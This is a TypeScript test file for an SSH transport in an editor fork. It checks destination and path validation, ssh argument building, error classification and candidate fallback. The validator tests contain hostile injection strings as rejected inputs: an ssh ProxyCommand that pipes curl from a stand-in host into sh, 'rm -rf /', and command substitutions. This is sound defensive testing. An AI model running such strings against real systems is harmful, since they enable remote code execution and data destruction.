/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import * as cp from 'child_process';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { NullLogger } from '../../../log/common/log.js';
import { IWispdTransportClose } from '../../common/wispdClient.js';
import { IWispdProcessStreams } from '../../node/wispdTransport.js';
import { WispdSshTransport, buildSshArgs, makeSshClassifier, validateRemoteWispdPath, validateSshDestination } from '../../node/wispdSshTransport.js';

suite('validateSshDestination', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('accepts a plain destination', () => {
		assert.strictEqual(validateSshDestination('mac-mini.local'), undefined);
		assert.strictEqual(validateSshDestination('ryan@mac-mini'), undefined);
		assert.strictEqual(validateSshDestination('ssh://ryan@mac-mini:2222'), undefined);
	});

	test('rejects an empty destination', () => {
		assert.ok(validateSshDestination(''));
	});

	test('rejects a destination ssh would read as an option', () => {
		assert.ok(validateSshDestination('-oProxyCommand=curl evil.example | sh'));
		assert.ok(validateSshDestination('--help'));
	});

	test('rejects a leading "-" after a user or a scheme', () => {
		assert.ok(validateSshDestination('ryan@-oProxyCommand=x'));
		assert.ok(validateSshDestination('ssh://-oProxyCommand=x'));
	});

	test('rejects whitespace', () => {
		assert.ok(validateSshDestination('mac mini'));
		assert.ok(validateSshDestination('mac-mini\tlocal'));
	});

	test('rejects a control character', () => {
		assert.ok(validateSshDestination('mac-mini\u0007'));
	});

	test('rejects a C1 control or invisible formatting character', () => {
		assert.ok(validateSshDestination('mac-mini\u0085'), 'NEL');
		assert.ok(validateSshDestination('mac-mini\u009b'), 'CSI');
		assert.ok(validateSshDestination('mac​-mini'), 'zero-width space');
		assert.ok(validateSshDestination('mac-mini‮'), 'right-to-left override');
	});

	test('rejects a shell metacharacter', () => {
		assert.ok(validateSshDestination('host;rm -rf /'));
		assert.ok(validateSshDestination('host`id`'));
		assert.ok(validateSshDestination('host$(id)'));
		assert.ok(validateSshDestination('host|cat'));
		assert.ok(validateSshDestination('host&'));
	});
});

suite('validateRemoteWispdPath', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('accepts a plain absolute path', () => {
		assert.strictEqual(validateRemoteWispdPath('/opt/homebrew/bin/wispd'), undefined);
		assert.strictEqual(validateRemoteWispdPath('/usr/local/bin/wispd'), undefined);
	});

	test('rejects a relative path', () => {
		assert.ok(validateRemoteWispdPath('wispd'));
	});

	test('rejects shell injection through a second command', () => {
		assert.ok(validateRemoteWispdPath('/x; touch /tmp/p'));
	});

	test('rejects command substitution', () => {
		assert.ok(validateRemoteWispdPath('/x$(id)'));
		assert.ok(validateRemoteWispdPath('/x`id`'));
	});

	test('rejects a space', () => {
		assert.ok(validateRemoteWispdPath('/a b/wispd'));
	});
});

suite('buildSshArgs', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('matches decision record 0007 exactly', () => {
		assert.deepStrictEqual(
			buildSshArgs('mac-mini.local', 'wispd'),
			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', 'wispd', 'attach'],
		);
	});

	test('carries an absolute remote path through unchanged', () => {
		assert.deepStrictEqual(
			buildSshArgs('mac-mini.local', '/opt/homebrew/bin/wispd'),
			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', '/opt/homebrew/bin/wispd', 'attach'],
		);
	});
});

suite('makeSshClassifier', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	const classify = makeSshClassifier('mac-mini.local');

	test('exit 4 means wispd attach ran but could not reach or start wispd', () => {
		assert.strictEqual(classify(4, null, '', false).reason, 'unreachable');
	});

	test('exit 127 means the remote shell never found the command', () => {
		assert.strictEqual(classify(127, null, 'bash: line 1: wispd: command not found', false).reason, 'wispdNotFound');
	});

	test('exit 255 with a permission-denied stderr, before any line arrived, is an auth failure', () => {
		const result = classify(255, null, 'ryan@mac-mini: Permission denied (publickey,password,keyboard-interactive).', false);
		assert.strictEqual(result.reason, 'authFailed');
		assert.match(result.message, /mac-mini\.local/);
	});

	test('exit 255 with an unknown host key, before any line arrived, is hostKeyUnknown', () => {
		assert.strictEqual(classify(255, null, 'Host key verification failed.', false).reason, 'hostKeyUnknown');
	});

	test('exit 255 with a changed host key is hostKeyChanged, not hostKeyUnknown, and warns of a possible attack', () => {
		const stderr = '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nHost key verification failed.';
		const result = classify(255, null, stderr, false);
		assert.strictEqual(result.reason, 'hostKeyChanged');
		assert.match(result.message, /possible attack/);
		assert.match(result.message, /verify.*out of band/i);
		assert.doesNotMatch(result.message, /\baccept it\b/);
	});

	test('exit 255 with a connection-level stderr is no route', () => {
		assert.strictEqual(classify(255, null, 'ssh: connect to host mac-mini.local port 22: Operation timed out', false).reason, 'noRoute');
		assert.strictEqual(classify(255, null, 'ssh: connect to host mac-mini.local port 22: Connection refused', false).reason, 'noRoute');
	});

	test('exit 255 with unrecognized stderr, before any line arrived, falls back to exited', () => {
		assert.strictEqual(classify(255, null, 'something ssh never says', false).reason, 'exited');
	});

	test('any other exit code is exited', () => {
		assert.strictEqual(classify(1, null, '', false).reason, 'exited');
	});

	test('once a line has arrived, a 255 is never authFailed or hostKeyUnknown, even with matching stderr left over', () => {
		const authLike = classify(255, null, 'Permission denied (publickey).', true);
		assert.notStrictEqual(authLike.reason, 'authFailed');
		const hostKeyLike = classify(255, null, 'Host key verification failed.', true);
		assert.notStrictEqual(hostKeyLike.reason, 'hostKeyUnknown');
	});

	test('once a line has arrived, a 255 with a connection-level stderr is still noRoute', () => {
		assert.strictEqual(classify(255, null, 'ssh: connect to host mac-mini.local port 22: Connection refused', true).reason, 'noRoute');
	});

	test('once a line has arrived, a 255 with no recognizable stderr is exited', () => {
		assert.strictEqual(classify(255, null, 'Permission denied (publickey).', true).reason, 'exited');
	});

	test('messages name the real destination and the integrated terminal, not a placeholder', () => {
		const authFailed = classify(255, null, 'Permission denied (publickey).', false);
		assert.match(authFailed.message, /"ssh mac-mini\.local"/);
		assert.match(authFailed.message, /integrated terminal/);
		assert.doesNotMatch(authFailed.message, /<destination>/);
		const hostKeyUnknown = classify(255, null, 'Host key verification failed.', false);
		assert.match(hostKeyUnknown.message, /"ssh mac-mini\.local"/);
		assert.match(hostKeyUnknown.message, /integrated terminal/);
	});
});

suite('WispdSshTransport', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	/** Spawns real node processes; each candidate's remote command picks its own script. */
	function run(destination: string, candidates: readonly string[], scriptFor: (remoteCommand: string) => string): { transport: WispdSshTransport; lines: string[]; close: Promise<IWispdTransportClose>; spawned: string[] } {
		const spawned: string[] = [];
		const spawn = (args: readonly string[]) => {
			const remoteCommand = args[args.length - 2];
			spawned.push(remoteCommand);
			return cp.spawn(process.execPath, ['-e', scriptFor(remoteCommand)], { stdio: ['pipe', 'pipe', 'pipe'] }) as cp.ChildProcess & IWispdProcessStreams;
		};
		const transport = store.add(new WispdSshTransport(destination, candidates, spawn, 'ssh -- host wispd attach', new NullLogger(), 1024, makeSshClassifier(destination)));
		const lines: string[] = [];
		store.add(transport.onDidReceiveLine(line => lines.push(line)));
		const close = new Promise<IWispdTransportClose>(resolve => store.add(transport.onDidClose(resolve)));
		return { transport, lines, close, spawned };
	}

	const notFoundScript = (remoteCommand: string) => `process.stderr.write('bash: line 1: ${remoteCommand}: command not found\\n'); process.exitCode = 127;`;
	// Prints a noisy line first, as a shell startup file over SSH would (0007), before failing to
	// find the command — the exact combination that dropped `initialize` before the fix.
	const noisyThenNotFoundScript = (remoteCommand: string) => `process.stdout.write('Last login: Tue Sep 24 on ttys000\\n'); process.stderr.write('bash: line 1: ${remoteCommand}: command not found\\n'); process.exitCode = 127;`;
	// Answers only once it has read a whole line, so a candidate that never reads stdin (because
	// it exited before anything was replayed to it) would leave the test waiting, not passing by accident.
	const echoScript = `let buf = ''; process.stdin.setEncoding('utf8'); process.stdin.on('data', d => { buf += d; if (buf.includes('\\n')) { process.stdout.write('{"ok":1}\\n'); } });`;
	// Answers once, like echoScript, then exits 127 afterwards: a connection that worked and later
	// hit some unrelated 127 (a shell alias changing mid-session, say), not a missing command.
	const echoThenNotFoundScript = `let buf = ''; process.stdin.setEncoding('utf8'); process.stdin.on('data', d => { buf += d; if (buf.includes('\\n')) { process.stdout.write('{"ok":1}\\n'); setTimeout(() => { process.stderr.write('bash: line 1: wispd: command not found\\n'); process.exit(127); }, 50); } });`;

	test('uses the first candidate when it works', async () => {
		const { transport, close, lines, spawned } = run('mac-mini', ['wispd'], () => echoScript);
		transport.send('{"method":"initialize"}');
		await new Promise(resolve => setTimeout(resolve, 200));
		assert.deepStrictEqual(spawned, ['wispd']);
		assert.deepStrictEqual(lines, ['{"ok":1}']);
		void close; // still open; nothing closed it
	});

	test('falls back to the next candidate on exit 127, replaying what was already sent', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd', '/usr/local/bin/wispd'];
		const { transport, lines, spawned } = run('mac-mini', candidates, remote => remote === '/opt/homebrew/bin/wispd' ? echoScript : notFoundScript(remote));
		// Sent to the first candidate, which exits before ever reading it (decision record 0007's
		// handshake is exactly this shape: WispdClient sends `initialize` once, up front).
		transport.send('{"method":"initialize"}');
		await new Promise(resolve => setTimeout(resolve, 300));
		assert.deepStrictEqual(spawned, ['wispd', '/opt/homebrew/bin/wispd']);
		assert.deepStrictEqual(lines, ['{"ok":1}']);
	});

	test('B1: replays what was sent even when the first candidate prints a noisy line before exiting 127', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const { transport, lines, spawned } = run('mac-mini', candidates, remote => remote === '/opt/homebrew/bin/wispd' ? echoScript : noisyThenNotFoundScript(remote));
		transport.send('{"method":"initialize"}');
		await new Promise(resolve => setTimeout(resolve, 300));
		assert.deepStrictEqual(spawned, ['wispd', '/opt/homebrew/bin/wispd']);
		// The noisy line still comes through (it's not this transport's job to filter it out; that's
		// WispdClient.onLine), but it must not have cleared the buffer before the replay.
		assert.deepStrictEqual(lines, ['Last login: Tue Sep 24 on ttys000', '{"ok":1}']);
	});

	test('reports wispdNotFound once every candidate is exhausted', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const { close, spawned } = run('mac-mini', candidates, remote => notFoundScript(remote));
		const result = await close;
		assert.deepStrictEqual(spawned, candidates);
		assert.strictEqual(result.reason, 'wispdNotFound');
		assert.strictEqual(result.exitCode, 127);
	});

	test('does not try another candidate for a non-127 failure', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const authFailScript = `process.stderr.write('Permission denied (publickey).\\n'); process.exitCode = 255;`;
		const { close, spawned } = run('mac-mini', candidates, () => authFailScript);
		const result = await close;
		assert.deepStrictEqual(spawned, ['wispd']);
		assert.strictEqual(result.reason, 'authFailed');
	});

	test('B2: once a candidate has answered, a later exit 127 just closes, with no retry or replay', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const { transport, lines, close, spawned } = run('mac-mini', candidates, () => echoThenNotFoundScript);
		transport.send('{"method":"initialize"}');
		const result = await close;
		assert.deepStrictEqual(spawned, ['wispd'], 'no respawn to the next candidate once settled');
		assert.deepStrictEqual(lines, ['{"ok":1}']);
		assert.strictEqual(result.reason, 'wispdNotFound');
	});
});
